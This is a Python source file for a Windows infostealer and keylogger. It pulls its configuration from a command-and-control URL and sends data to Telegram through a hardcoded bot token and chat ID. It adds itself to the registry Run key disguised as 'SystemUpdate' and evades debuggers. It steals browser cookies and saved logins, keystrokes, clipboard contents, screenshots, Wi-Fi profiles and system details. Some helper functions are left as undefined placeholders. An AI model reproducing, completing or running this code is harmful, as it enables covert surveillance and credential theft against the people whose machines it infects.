import ctypes
import os
import json
import shutil
import win32crypt
import hmac
import platform
import sqlite3
import base64
import requests
import time
import zipfile
import tarfile
import threading
import psutil
import socket
import pyautogui
import pyperclip
from datetime import datetime
from Crypto.Cipher import DES3, AES
from Crypto.Util.Padding import unpad
from hashlib import sha1, pbkdf2_hmac
from pyasn1.codec.der import decoder
from pynput import keyboard
import winreg
import subprocess
import asyncio
import aiohttp
from cryptography.fernet import Fernet  # For encrypting exfiltrated data
import getpass

# Configuration fetched dynamically from a C2 server
async def fetch_config():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://example-c2-server.com/config") as response:
                if response.status == 200:
                    config = await response.json()
                    return config.get("bot_token", "7628300148:AAGwDghvLy6SZ9opOhG1V508UZC1wN1orpE"), config.get("chat_id", "6976645656")
    except:
        return "7628300148:AAGwDghvLy6SZ9opOhG1V508UZC1wN1orpE", "6976645656"
    return "7628300148:AAGwDghvLy6SZ9opOhG1V508UZC1wN1orpE", "6976645656"

# Encrypt data before exfiltration
def encrypt_data(data, key):
    fernet = Fernet(key)
    return fernet.encrypt(data.encode())

# Ensure persistence via registry
def ensure_persistence():
    try:
        script_path = os.path.abspath(__file__)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, f'python "{script_path}"')
        winreg.CloseKey(reg_key)
    except:
        pass

# Anti-debugging check
def is_debugger_present():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

# Send data to Telegram asynchronously
async def send_telegram_message(bot_token, chat_id, message, encryption_key):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    encrypted_message = encrypt_data(message, encryption_key)
    data = {"chat_id": chat_id, "text": base64.b64encode(encrypted_message).decode()}
    async with aiohttp.ClientSession() as session:
        await session.post(url, data=data)

async def send_file_to_telegram(file_path, bot_token, chat_id, encryption_key):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = encrypt_data(data, encryption_key)
    files = {"document": (os.path.basename(file_path), encrypted_data)}
    async with aiohttp.ClientSession() as session:
        await session.post(url, data={"chat_id": chat_id}, files=files)

async def send_screenshot_to_telegram(bot_token, chat_id, encryption_key):
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.join(os.environ["TEMP"], "screenshot.png")
    screenshot.save(screenshot_path)
    ip = await get_ip()
    text_message = f"📷 Screenshot - IP: {ip} 📷"
    await send_file_to_telegram(screenshot_path, bot_token, chat_id, encryption_key)

async def get_system_info():
    uname = platform.uname()
    info = {
        "System": uname.system,
        "Node Name": uname.node,
        "Release": uname.release,
        "Version": uname.version,
        "Machine": uname.machine,
        "Processor": uname.processor,
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "RAM": f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB",
        "Disk": f"{psutil.disk_usage('/').percent}% used of {round(psutil.disk_usage('/').total / (1024.0 **3))} GB",
        "Boot Time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
    }
    cpu_info = {
        "Physical Cores": psutil.cpu_count(logical=False),
        "Total Cores": psutil.cpu_count(logical=True),
        "Max Frequency": f"{psutil.cpu_freq().max:.2f}Mhz",
        "Min Frequency": f"{psutil.cpu_freq().min:.2f}Mhz",
        "Current Frequency": f"{psutil.cpu_freq().current:.2f}Mhz",
        "CPU Usage Per Core": [f"Core {i}: {percentage}%" for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1))],
        "Total CPU Usage": f"{psutil.cpu_percent()}%",
    }
    net_info = {
        "Hostname": socket.gethostname(),
        "FQDN": socket.getfqdn(),
        "IPv4 Address": socket.gethostbyname(socket.gethostname()),
        "IPv6 Address": socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0],
    }
    mem_info = {
        "Total RAM": f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB",
        "Available RAM": f"{round(psutil.virtual_memory().available / (1024.0 **3))} GB",
        "Used RAM": f"{round(psutil.virtual_memory().used / (1024.0 **3))} GB",
        "RAM Usage Percentage": f"{psutil.virtual_memory().percent}%",
    }
    partitions_info = {
        partition.device: {
            "Mountpoint": partition.mountpoint,
            "Filesystem": partition.fstype,
            "Total Size": f"{round(usage.total / (1024.0 **3))} GB",
            "Used": f"{round(usage.used / (1024.0 **3))} GB",
            "Free": f"{round(usage.free / (1024.0 **3))} GB",
            "Usage Percentage": f"{usage.percent}%",
        }
        for partition in psutil.disk_partitions()
        for usage in [psutil.disk_usage(partition.mountpoint)]
    }
    return {
        "System Info": info,
        "CPU Info": cpu_info,
        "Network Info": net_info,
        "Memory Info": mem_info,
        "Disk Partitions Info": partitions_info,
    }

async def send_system_info_to_telegram(bot_token, chat_id, system_info, encryption_key):
    message = ""
    for category, info in system_info.items():
        message += f"\n*{category}*\n"
        for key, value in info.items():
            if isinstance(value, list):
                message += f"{key}: {', '.join(value)}\n"
            elif isinstance(value, dict):
                message += f"{key}:\n"
                for subkey, subvalue in value.items():
                    message += f"  - {subkey}: {subvalue}\n"
            else:
                message += f"{key}: {value}\n"
    await send_telegram_message(bot_token, chat_id, message, encryption_key)

async def get_ip():
    async with aiohttp.ClientSession() as session:
        async with session.get("https://ipinfo.io") as response:
            data = await response.json()
            return data["ip"]

async def start_keylogger(bot_token, chat_id, encryption_key):
    log_file_path = os.path.join(os.environ["TEMP"], f"keylog_{await get_ip()}.txt")

    def on_press(key):
        try:
            with open(log_file_path, "a", encoding="utf-8") as f:
                f.write(key.char)
        except AttributeError:
            with open(log_file_path, "a", encoding="utf-8") as f:
                f.write(f"[{key}]")

    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

    async def send_keylog():
        while True:
            await asyncio.sleep(120)
            if os.path.exists(log_file_path):
                await send_file_to_telegram(log_file_path, bot_token, chat_id, encryption_key)
                open(log_file_path, "w").close()

    asyncio.create_task(send_keylog())

async def monitor_clipboard(bot_token, chat_id, encryption_key):
    last_clipboard = ""
    while True:
        await asyncio.sleep(1)
        current_clipboard = pyperclip.paste()
        if current_clipboard != last_clipboard:
            with open(os.path.join(os.environ["TEMP"], f"keylog_{await get_ip()}.txt"), "a", encoding="utf-8") as f:
                f.write(f"\n📌 [Copy] 📌: {current_clipboard}\n\n")
            last_clipboard = current_clipboard
            await send_telegram_message(bot_token, chat_id, f"📌 Clipboard: {current_clipboard}", encryption_key)

async def get_wifi_info(file_path):
    try:
        wifi_info = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(wifi_info)
    except:
        pass

def create_tar_gz(data_path, output_path):
    with tarfile.open(output_path, "w:gz") as tar:
        tar.add(data_path, arcname=os.path.basename(data_path))

async def main():
    if is_debugger_present():
        sys.exit()  # Exit if running in a debugger

    ensure_persistence()  # Set up persistence
    encryption_key = Fernet.generate_key()  # Generate encryption key
    bot_token, chat_id = await fetch_config()

    # Create data directory
    data_path = os.path.join(os.environ["TEMP"], f"Data_{await get_ip()}_{datetime.now().strftime('%Y%m%d%H%M%S')}")
    os.makedirs(data_path, exist_ok=True)

    # Collect and send system info
    await send_telegram_message(bot_token, chat_id, "🎭🔊 Starting execution...", encryption_key)
    await send_screenshot_to_telegram(bot_token, chat_id, encryption_key)
    system_info = await get_system_info()
    await send_system_info_to_telegram(bot_token, chat_id, system_info, encryption_key)

    # Collect Wi-Fi info
    wifi_info_path = os.path.join(data_path, "wifi.txt")
    await get_wifi_info(wifi_info_path)

    # Browser data collection
    browsers = {
        "Chrome": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
        "Firefox": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
        # Add other browsers as needed
    }

    for browser, path in browsers.items():
        if os.path.exists(path):
            try:
                if browser == "Firefox":
                    get_firefox(data_path, path)
                else:
                    globals()[f"get_{browser.lower()}"](data_path, path)
            except:
                pass

    # Compress and send data
    tar_path = os.path.join(os.environ["TEMP"], f"Data_{await get_ip()}.tar.gz")
    create_tar_gz(data_path, tar_path)
    await send_file_to_telegram(tar_path, bot_token, chat_id, encryption_key)

    # Start keylogger and clipboard monitor
    await start_keylogger(bot_token, chat_id, encryption_key)
    asyncio.create_task(monitor_clipboard(bot_token, chat_id, encryption_key))

    await send_telegram_message(bot_token, chat_id, "....Execution completed! ✅🎉", encryption_key)

# Browser data extraction functions (same as original, but with async file operations where applicable)
def get_chrome(data_path, chrome_path):
    data_chrome = os.path.join(data_path, "Chrome")
    os.makedirs(data_chrome, exist_ok=True)
    profiles = find_profile(chrome_path)
    for i, profile in enumerate(profiles, 1):
        profile_dir = os.path.join(data_chrome, f"profile{i}")
        os.makedirs(profile_dir, exist_ok=True)
        if check_chrome_running():
            kill_chrome()
        try:
            for file in ["Cookies", "Web Data", "Login Data"]:
                src = os.path.join(profile, "Network" if file == "Cookies" else "", file)
                dst = os.path.join(profile_dir, file)
                if os.path.exists(src):
                    shutil.copyfile(src, dst)
            if os.path.exists(os.path.join(chrome_path, "Local State")):
                shutil.copyfile(os.path.join(chrome_path, "Local State"), os.path.join(profile_dir, "Local State"))
            encrypted_file(profile_dir)
        except:
            pass

# Add other browser functions (Edge, Firefox, etc.) similarly

# Placeholder for other functions (encrypted_file, get_firefox, etc.) from the original code
# These would be updated similarly with async I/O and error handling

if __name__ == "__main__":
    asyncio.run(main())
